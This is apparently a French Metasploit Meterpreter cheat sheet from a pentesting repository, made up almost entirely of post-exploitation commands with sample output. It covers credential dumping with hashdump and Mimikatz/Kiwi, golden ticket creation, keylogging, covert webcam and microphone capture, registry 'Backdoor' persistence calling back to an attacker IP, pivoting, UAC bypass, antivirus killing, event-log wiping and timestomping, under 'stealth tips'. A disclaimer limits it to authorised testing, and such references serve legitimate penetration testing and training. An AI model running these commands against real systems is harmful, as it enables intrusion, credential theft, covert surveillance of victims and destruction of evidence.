# 🎭 Meterpreter — fiche pratique complète

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **L’outil de référence pour la post-exploitation** — Votre boîte à outils après l’obtention d’un accès

> **Précisions de version et de comportement :** les fonctions disponibles dépendent de la plateforme, de la charge utile et des extensions. Les scripts `persistence`, `metsvc`, `autoroute`, `scraper` et `winenum` sont des exemples historiques ; les noms et options sont conservés. Dans la [documentation officielle des sessions](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/), `exit` et `quit` terminent la session ; `background` revient à msfconsole sans la fermer. `getsystem` tente une élévation : il ne se contente pas de vérifier le niveau courant. Migrer dans `lsass.exe` n’est pas une condition générale de `hashdump` et peut être bloqué par les protections de Windows. Une exécution en mémoire ou une migration ne garantit pas l’absence de traces. La mention TLS du tableau est une simplification : les propriétés de communication dépendent du transport et de l’implémentation choisis ; voir la [configuration officielle des transports Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html).

---

## 📋 Table des matières

- [Qu’est-ce que Meterpreter ?](#-quest-ce-que-meterpreter-)
- [Commandes principales](#-commandes-principales)
- [Informations système](#-informations-système)
- [Commandes du système de fichiers](#-commandes-du-système-de-fichiers)
- [Commandes réseau](#-commandes-réseau)
- [Commandes de gestion des processus](#-commandes-de-gestion-des-processus)
- [Commandes utilisateur et privilèges](#-commandes-utilisateur-et-privilèges)
- [Collecte de mots de passe](#-collecte-de-mots-de-passe)
- [Enregistrement des frappes clavier](#-enregistrement-des-frappes-clavier)
- [Captures d’écran et webcam](#-captures-décran-et-webcam)
- [Persistance](#-persistance)
- [Rebond et redirection de ports](#-rebond-et-redirection-de-ports)
- [Effacement et modification des traces](#-effacement-et-modification-des-traces)
- [Scripts et automatisation](#-scripts-et-automatisation)
- [Tableau de référence rapide](#-tableau-de-référence-rapide)
- [Conseils et astuces](#-conseils-et-astuces)

---

## 🎯 Qu’est-ce que Meterpreter ?

**Meterpreter** (Meta-Interpreter) est une charge utile avancée et extensible dynamiquement. Le document source décrit son fonctionnement par injection de DLL en mémoire et communication via une connexion établie par un stager.

### Principales fonctionnalités

| Fonctionnalité | Description |
|---------|-------------|
| **Exécution en mémoire** | S’exécute en mémoire vive en laissant peu de traces selon le document source |
| **Communications chiffrées** | Canal chiffré par TLS vers le serveur de commande et contrôle (C2) |
| **Extensible** | Charger des extensions à la volée |
| **Multiplateforme** | Windows, Linux, macOS, Android, PHP, Java |
| **Capacité de rebond** | Faire transiter le trafic par des hôtes compromis |

### Types de Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-commandes-principales"></a>
## ⌨️ Commandes principales

### Aide et navigation

```bash
# Afficher toutes les commandes
meterpreter > help

# Obtenir l’aide d’une commande précise
meterpreter > help upload

# Afficher les informations des canaux
meterpreter > channel -l
```

### Gestion des sessions

```bash
# Obtenir les informations de session
meterpreter > info

# Mettre la session courante en arrière-plan
meterpreter > background
meterpreter > bg

# Revenir à msfconsole
meterpreter > exit

# Terminer complètement la session
meterpreter > quit

# Se reconnecter si la connexion est interrompue
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Opérations sur les canaux

```bash
# Lister les canaux actifs
meterpreter > channel -l

# Interagir avec un canal
meterpreter > channel -i <id>

# Lire un canal
meterpreter > channel -r <id>

# Écrire dans un canal
meterpreter > channel -w <id>

# Fermer un canal
meterpreter > channel -c <id>
```

---

## 💻 Informations système

### Informations système de base

```bash
# Obtenir les informations système
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Obtenir l’utilisateur courant
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obtenir l’identifiant du processus courant
meterpreter > getpid
Current pid: 1234

# Obtenir le nom du processus
meterpreter > getpname

# Vérifier si l’exécution a lieu dans une machine virtuelle
meterpreter > run post/windows/gather/checkvm
```

### Environnement et Registre

```bash
# Lister les variables d’environnement
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Définir une variable d’environnement
meterpreter > setenv VAR value

# Opérations sur le Registre (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Logiciels installés et correctifs

```bash
# Lister les applications installées
meterpreter > run post/windows/gather/enum_applications

# Lister les correctifs installés
meterpreter > run post/windows/gather/enum_patches

# Rechercher les chemins de service sans guillemets
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 Commandes du système de fichiers

### Navigation

```bash
# Afficher le répertoire de travail
meterpreter > pwd
C:\Users\Administrator\Desktop

# Lister le contenu du répertoire
meterpreter > ls
meterpreter > ls -la

# Changer de répertoire
meterpreter > cd C:\\Users
meterpreter > cd ..

# Afficher le répertoire local courant
meterpreter > lpwd

# Changer de répertoire local
meterpreter > lcd /tmp

# Lister le répertoire local
meterpreter > lls
```

### Opérations sur les fichiers

```bash
# Lire le contenu d’un fichier
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Modifier un fichier
meterpreter > edit C:\\file.txt

# Supprimer un fichier
meterpreter > rm C:\\temp\\malware.exe

# Créer un répertoire
meterpreter > mkdir C:\\temp\\hidden

# Supprimer un répertoire
meterpreter > rmdir C:\\temp\\hidden

# Copier un fichier
meterpreter > cp source.txt destination.txt

# Déplacer ou renommer un fichier
meterpreter > mv oldname.txt newname.txt
```

### Transfert de fichiers

```bash
# Télécharger un fichier depuis la cible
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Télécharger récursivement
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Téléverser un fichier vers la cible
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Afficher la progression des transferts
meterpreter > download -p C:\\large_file.zip
```

### Recherche de fichiers

```bash
# Rechercher des fichiers
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Rechercher une extension précise sur tous les lecteurs
meterpreter > search -f *.kdbx

# Rechercher des motifs précis dans les noms de fichiers
meterpreter > search -f *password* -r
```

### Empreintes et horodatages des fichiers

```bash
# Obtenir l’empreinte d’un fichier
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Modifier les horodatages (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Commandes réseau

### Informations réseau

```bash
# Obtenir les interfaces réseau
meterpreter > ipconfig
meterpreter > ifconfig

# Obtenir la table de routage
meterpreter > route

# Obtenir le cache ARP
meterpreter > arp

# Obtenir les connexions réseau actives
meterpreter > netstat
```

### Redirection de ports

```bash
# Rediriger un port local vers une destination distante
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Lister les redirections de ports
meterpreter > portfwd list

# Supprimer une redirection de port
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Supprimer toutes les redirections de ports
meterpreter > portfwd flush

# Exemple : rediriger RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Se connecter ensuite : rdesktop 127.0.0.1:3389
```

### Utilitaires DNS et réseau

```bash
# Résoudre un nom d’hôte
meterpreter > resolve google.com

# Obtenir les paramètres du proxy
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-commandes-de-gestion-des-processus"></a>
## ⚙️ Commandes de gestion des processus

### Liste des processus

```bash
# Lister tous les processus
meterpreter > ps

# Filtrer les processus
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Obtenir les informations du processus courant
meterpreter > getpid
```

### Manipulation des processus

```bash
# Migrer vers un autre processus
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Terminer un processus
meterpreter > kill <PID>

# Exécuter une commande et obtenir sa sortie
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Exécuter en arrière-plan
meterpreter > execute -f notepad.exe -H

# Exécuter avec des entrées/sorties par canal
meterpreter > execute -f cmd.exe -c -i
```

### Conseils de migration de processus

```bash
# Cibles de migration présentées comme stables (Windows)
# - explorer.exe (contexte utilisateur, stable)
# - svchost.exe (SYSTEM, plusieurs instances)
# - lsass.exe (SYSTEM, présenté comme nécessaire à hashdump dans la source)

# Rechercher explorer.exe et migrer
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Migrer automatiquement vers un processus stable
meterpreter > run post/windows/manage/migrate
```

---

## 👤 Commandes utilisateur et privilèges

### Informations sur l’utilisateur courant

```bash
# Obtenir l’utilisateur courant
meterpreter > getuid
Server username: WIN-PC\Administrator

# Obtenir les privilèges courants
meterpreter > getprivs

# Vérifier l’élévation des privilèges (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Élévation de privilèges

```bash
# Tenter d’obtenir les privilèges SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Usurpation via canal nommé (en mémoire/administrateur)
meterpreter > getsystem -t 2  # Usurpation via canal nommé (fichier déposé/administrateur)
meterpreter > getsystem -t 3  # Duplication de jeton (en mémoire/administrateur)

# Contournement de l’UAC (depuis msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Recherche d’exploits locaux possibles
meterpreter > run post/multi/recon/local_exploit_suggester

# Récupérer le jeton d’un autre processus
meterpreter > steal_token <PID>

# Abandonner le jeton récupéré
meterpreter > drop_token

# Usurper l’identité d’un utilisateur
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Lister les jetons disponibles
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Énumération des utilisateurs

```bash
# Lister les utilisateurs locaux
meterpreter > run post/windows/gather/enum_logged_on_users

# Lister les utilisateurs du domaine (si la machine y est jointe)
meterpreter > run post/windows/gather/enum_domain_users

# Lister les groupes locaux
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Collecte de mots de passe

### Extraction des empreintes de mots de passe

```bash
# Extraire les empreintes de mots de passe (nécessite SYSTEM dans cet exemple)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Si hashdump échoue, essayer
meterpreter > run post/windows/gather/smart_hashdump
```

### Extension Mimikatz / Kiwi

```bash
# Charger Kiwi (Mimikatz)
meterpreter > load kiwi

# Récupérer tous les identifiants
meterpreter > creds_all

# Obtenir les mots de passe présents en mémoire
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Extraire les tickets Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Obtenir les mots de passe Wi-Fi
meterpreter > kiwi_cmd misc::wifi

# Extraction LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Ticket d’or (Golden Ticket)
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Collecte d’identifiants

```bash
# Rechercher des identifiants dans les fichiers
meterpreter > run post/multi/gather/credentials/generic

# Identifiants des navigateurs
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Clés SSH
meterpreter > run post/multi/gather/ssh_creds

# Gestionnaire d’identifiants Windows
meterpreter > run post/windows/gather/enum_cred_store

# Identifiants Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-enregistrement-des-frappes-clavier"></a>
## ⌨️ Enregistrement des frappes clavier

### Démarrer et arrêter l’enregistreur de frappes

```bash
# Démarrer l’enregistreur de frappes
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Extraire les frappes capturées
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Arrêter l’enregistreur de frappes
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Enregistrement avancé des frappes

```bash
# Exécuter l’enregistreur de frappes dans un processus distinct
meterpreter > run post/windows/capture/keylog_recorder

# Migrer vers un processus ayant accès au clavier (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Captures d’écran et webcam

### Captures d’écran

```bash
# Effectuer une capture d’écran
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Effectuer une capture avec un chemin personnalisé
meterpreter > screenshot -p /tmp/screen.jpg

# Captures d’écran continues
meterpreter > run post/multi/gather/screen_spy

# Afficher le bureau en temps réel
meterpreter > screenshare
```

### Opérations sur la webcam

```bash
# Lister les webcams
meterpreter > webcam_list
1: Integrated Webcam

# Capturer une image de la webcam
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Capturer une image avec des options
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Diffuser la webcam en temps réel
meterpreter > webcam_stream
```

### Enregistrement audio

```bash
# Enregistrer le microphone
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Enregistrer avec une durée personnalisée
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Persistance

### Persistance sous Windows

```bash
# Persistance dans le Registre
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Persistance par tâche planifiée
meterpreter > run post/windows/manage/persistence_exe

# Persistance par service
meterpreter > run metsvc

# Persistance WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Explication des options de persistance

```bash
# Options du script persistence
-A        # Démarrer automatiquement un gestionnaire compatible
-L <path> # Emplacement où écrire la charge utile
-P <path> # Charge utile à utiliser
-S        # Démarrer en tant que service (avec SYSTEM)
-T        # Autre modèle d’exécutable EXE
-U        # Démarrer à la connexion de l’utilisateur
-X        # Démarrer au démarrage du système
-i <sec>  # Intervalle entre les tentatives de connexion
-p <port> # Port auquel la charge utile se connecte
-r <ip>   # Adresse IP à laquelle la charge utile se connecte
```

### Supprimer la persistance

```bash
# Lister les mécanismes de persistance
meterpreter > run post/windows/gather/enum_persistence

# Supprimer la persistance manuellement
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Rebond et redirection de ports

### Gestion des routes

```bash
# Ajouter une route via la session
meterpreter > run autoroute -s 10.10.10.0/24

# Afficher les routes
meterpreter > run autoroute -p

# Supprimer une route
meterpreter > run autoroute -d -s 10.10.10.0/24

# Depuis msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### Proxy SOCKS

```bash
# Démarrer le proxy SOCKS (depuis msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Configurer proxychains
# Modifier /etc/proxychains.conf :
# socks4 127.0.0.1 1080

# Utiliser avec proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Exemples de redirection de ports

```bash
# Rediriger un port local vers un hôte interne
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Redirection de port inverse
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Exemples de scénarios :
# Accéder au serveur web interne
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Accéder au service RDP interne
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Accéder au service SMB interne
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Effacement et modification des traces

### Effacer les traces

```bash
# Effacer les journaux d’événements Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Modifier les horodatages des fichiers
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Techniques d’évasion

```bash
# Migrer vers un processus légitime
meterpreter > migrate -N svchost.exe

# Rechercher des logiciels de surveillance
meterpreter > run post/windows/gather/enum_av

# Désactiver l’antivirus (risqué)
meterpreter > run post/windows/manage/killav

# Masquer un processus
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Scripts et automatisation

### Scripts de ressources

```bash
# Créer un script de ressources
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Exécuter un script de ressources
meterpreter > resource post_exploit.rc
```

### Scripts courants

```bash
# Énumération du système
meterpreter > run scraper

# Collecter toutes les informations
meterpreter > run winenum

# Rechercher une machine virtuelle
meterpreter > run checkvm

# Obtenir les sous-réseaux locaux pour le rebond
meterpreter > run get_local_subnets

# Reconnaissance multiplateforme
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Console IRB (Ruby)

```bash
# Entrer en mode IRB
meterpreter > irb

# Exemple : lister les fichiers
>> client.fs.dir.entries("C:\\")

# Exemple : lire un fichier
>> client.fs.file.open("C:\\secret.txt").read

# Quitter IRB
>> exit
```

---

## 📊 Tableau de référence rapide

### Commandes essentielles

| Commande | Description |
|---------|-------------|
| `sysinfo` | Informations système |
| `getuid` | Utilisateur courant |
| `getpid` | Identifiant du processus courant |
| `ps` | Lister les processus |
| `migrate <PID>` | Migrer vers un autre processus |
| `getsystem` | Obtenir les privilèges SYSTEM |
| `hashdump` | Extraire les empreintes de mots de passe |
| `shell` | Ouvrir un interpréteur de commandes système |
| `upload <src> <dst>` | Téléverser un fichier |
| `download <src>` | Télécharger un fichier |
| `screenshot` | Capturer l’écran |
| `webcam_snap` | Capturer une image de la webcam |
| `keyscan_start` | Démarrer l’enregistreur de frappes |
| `keyscan_dump` | Récupérer les frappes enregistrées |

### Opérations sur les fichiers

| Commande | Description |
|---------|-------------|
| `pwd` | Afficher le répertoire de travail |
| `cd <dir>` | Changer de répertoire |
| `ls` | Lister les fichiers |
| `cat <file>` | Lire un fichier |
| `edit <file>` | Modifier un fichier |
| `rm <file>` | Supprimer un fichier |
| `mkdir <dir>` | Créer un répertoire |
| `search -f <pattern>` | Rechercher des fichiers |

### Opérations réseau

| Commande | Description |
|---------|-------------|
| `ipconfig` | Interfaces réseau |
| `route` | Table de routage |
| `netstat` | Connexions actives |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Rediriger un port |
| `run autoroute -s <subnet>` | Ajouter une route pour le rebond |

### Élévation de privilèges

| Commande | Description |
|---------|-------------|
| `getsystem` | Obtenir les privilèges SYSTEM |
| `getprivs` | Lister les privilèges courants |
| `steal_token <PID>` | Récupérer le jeton d’un processus |
| `load incognito` | Charger l’extension incognito |
| `list_tokens -u` | Lister les jetons disponibles |
| `impersonate_token` | Usurper le jeton d’un utilisateur |

### Collecte d’identifiants

| Commande | Description |
|---------|-------------|
| `hashdump` | Extraire les empreintes SAM |
| `load kiwi` | Charger Mimikatz |
| `creds_all` | Tous les identifiants |
| `lsa_dump_sam` | Extraction SAM par LSA |
| `kiwi_cmd <cmd>` | Exécuter une commande Mimikatz |

---

## 💡 Conseils et astuces

### Bonnes pratiques

1. **Migrer d’abord, selon le conseil du document source**
   ```bash
   # Migrer vers un processus stable avant les autres opérations
   meterpreter > migrate -N explorer.exe
   ```

2. **Mettre les sessions en arrière-plan**
   ```bash
   # Ne pas fermer les sessions ; les mettre en arrière-plan
   meterpreter > background
   ```

3. **Utiliser des charges utiles chiffrées**
   ```bash
   # Privilégier les charges utiles HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Vérifier avant d’agir**
   ```bash
   # Toujours vérifier les privilèges
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Dépannage

| Problème | Solution |
|-------|----------|
| La session s’arrête | Migrer vers un processus stable |
| hashdump échoue | Obtenir d’abord SYSTEM avec `getsystem` |
| getsystem échoue | Essayer une autre technique avec `-t 1,2,3` |
| Aucune frappe enregistrée | Migrer vers explorer.exe |
| Les commandes expirent | Vérifier la connectivité réseau |

### Conseils de discrétion

```bash
# 1. Quitter le processus initial par migration
meterpreter > migrate -N svchost.exe

# 2. Effacer les traces
meterpreter > clearev

# 3. Utiliser timestomp sur les fichiers téléversés
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Supprimer les fichiers déposés après utilisation
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Avertissement juridique

> **AVERTISSEMENT :** cette fiche est réservée à la formation et aux tests d’intrusion autorisés. L’accès non autorisé aux systèmes informatiques est illégal. Obtenez toujours l’autorisation nécessaire avant les tests.

---

## 📚 Ressources connexes

- [Guide de Metasploit Framework](./README.fr.md)
- [Documentation Offensive Security](https://www.offensive-security.com/)
- [Documentation Metasploit Rapid7](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Maîtrisez la post-exploitation !</b><br>
  <i>Avec Meterpreter, la pratique continue après l’accès initial</i>
</p>
